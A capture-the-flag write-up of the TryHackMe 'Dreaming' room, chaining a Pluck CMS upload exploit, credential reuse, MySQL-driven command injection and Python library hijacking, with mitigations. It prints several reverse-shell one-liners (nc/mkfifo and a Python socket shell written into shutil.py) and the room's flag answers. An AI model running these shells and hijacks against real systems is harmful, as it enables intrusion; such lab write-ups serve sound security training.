# 💤 Dreaming — TryHackMe Writeup

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen)
![Category](https://img.shields.io/badge/Category-Web%20|%20CMS%20|%20Lateral%20Movement%20|%20Python%20Library%20Hijacking-blue)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-green)

> **Author:** Miraç Akkuş (LatenT)
> **Date:** May 2026
> **Room:** [https://tryhackme.com/room/dreaming](https://tryhackme.com/room/dreaming)

---

## 📋 Executive Summary

This write-up documents the full exploitation of the **Dreaming** machine. The attack chain starts with a Pluck CMS file upload RCE, followed by plaintext credential reuse for lateral movement, MySQL command injection for privilege escalation to the `death` user, and finally Python library hijacking (`shutil.py`) to gain `morpheus/root` level access.

---

## 🛠️ Tools Used

| Tool                | Purpose                |
| ------------------- | ---------------------- |
| `nmap`              | Network enumeration    |
| `ffuf` / `gobuster` | Directory fuzzing      |
| `searchsploit`      | Exploit search         |
| `python3`           | Exploit execution      |
| `nc`                | Reverse shell listener |
| `mysql`             | Database interaction   |

---

## 🔍 Phase 1: Reconnaissance

```bash
nmap -sV -sC -T4 <IP>
```

| Port | Service |
| ---- | ------- |
| 22   | SSH     |
| 80   | Apache  |

```bash
ffuf -u http://<IP>/FUZZ -w raft-large-directories.txt
```

Discovered: `/app` with directory listing enabled.

Inside: `pluck-4.7.13` → Pluck CMS instance.

---

## 🌐 Phase 2: Pluck CMS RCE

### Admin Panel

`http://<IP>/app/pluck-4.7.13/admin`

Login: `password` (default credentials)

---

### Exploitation

```bash
searchsploit -m php/webapps/49909.py
python3 49909.py <IP> 80 password /app/pluck-4.7.13/
```

Shell uploaded to:
`/app/pluck-4.7.13/files/shell.php`

---

### Reverse Shell

```bash
nc -lvnp 9001

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> 9001 >/tmp/f
```

Resulting shell: `www-data`

---

## 🏴 Phase 3: Lucien Flag

Found `/opt/test.py`:

```python
url = "http://127.0.0.1/app/pluck-4.7.13/login.php"
password = "HeyLucien#@1999!"
```

SSH login:

```bash
ssh lucien@<IP>
# password: HeyLucien#@1999!
```

```bash
cat /home/lucien/lucien_flag.txt
```

**Lucien Flag:** `THM{TH3_L1BR4R14N}`

---

## 🚀 Phase 4: Death Flag

### Sudo Permissions

```bash
sudo -l
```

```
(lucien) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
```

---

### Script Analysis

```python
command = f"echo {dreamer} + {dream}"
shell = subprocess.check_output(command, text=True, shell=True)
```

Vulnerability: **command injection via `shell=True`**

---

### MySQL Access

Password found in `.bash_history`:
`lucien42DBPASSWORD`

```bash
mysql -u lucien -plucien42DBPASSWORD
use library;
```

---

### Command Injection Payload

```sql
INSERT INTO dreams (dreamer, dream)
VALUES ("evil", "$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP> 9002 >/tmp/f)");
```

Trigger:

```bash
nc -lvnp 9002
sudo -u death /usr/bin/python3 /home/death/getDreams.py
```

Shell obtained: `death`

```bash
cat /home/death/death_flag.txt
```

**Death Flag:** `THM{1M_TH3R3_4_TH3M}`

---

## 🐍 Phase 5: Morpheus Flag (Python Library Hijacking)

### Enumeration

```bash
find /usr/ -type f -writable 2>/dev/null
```

Finding:
`/usr/lib/python3.8/shutil.py` writable by `death` group.

---

### restore.py Analysis

```bash
cat /home/morpheus/restore.py
```

It imports `shutil` and runs via cron.

---

### Hijack shutil.py

```bash
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",9003));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' > /usr/lib/python3.8/shutil.py
```

Listener:

```bash
nc -lvnp 9003
```

After cron execution:

Shell: `morpheus`

```bash
cat /home/morpheus/morpheus_flag.txt
```

**Morpheus Flag:** `THM{DR34MS_5H4P3_TH3_W0RLD}`

---

## 🗺️ Attack Path

```
[Pluck CMS Admin]
    ↓
[File Upload RCE (default password)]
    ↓
[www-data shell]
    ↓
[/opt/test.py → credential leak]
    ↓
[SSH: lucien]
    ↓
[Lucien Flag]
    ↓
[sudo getDreams.py as death]
    ↓
[MySQL injection → RCE]
    ↓
[death shell]
    ↓
[Death Flag]
    ↓
[writable Python library]
    ↓
[shutil.py hijacking]
    ↓
[cron execution]
    ↓
[morpheus shell]
    ↓
[Morpheus Flag]
```

---

## 🛡️ Mitigations

| # | Vulnerability                    | Fix                                              |
| - | -------------------------------- | ------------------------------------------------ |
| 1 | Default credentials              | Strong password policy + MFA                     |
| 2 | Pluck CMS RCE                    | Update CMS + WAF rules                           |
| 3 | Plaintext credentials            | Secure storage + hashing                         |
| 4 | Command injection (`shell=True`) | Avoid shell=True, use parameterization           |
| 5 | Writable Python libs             | Proper file permissions (read-only system paths) |

---

## 🎓 Key Takeaways

1. Default credentials remain a real-world risk.
2. Plaintext secrets in scripts and history files are high-value targets.
3. `subprocess(..., shell=True)` is highly dangerous in injection-prone contexts.
4. Python library hijacking becomes critical when writable system paths exist.
5. Database → shell injection chains are still common in misconfigured applications.

---

## 🚩 Flags

| Flag     | User       | Value                         |
| -------- | ---------- | ----------------------------- |
| Lucien   | `lucien`   | `THM{TH3_L1BR4R14N}`          |
| Death    | `death`    | `THM{1M_TH3R3_4_TH3M}`        |
| Morpheus | `morpheus` | `THM{DR34MS_5H4P3_TH3_W0RLD}` |

---

**Author:** Lat (latent)
**Date:** May 2026
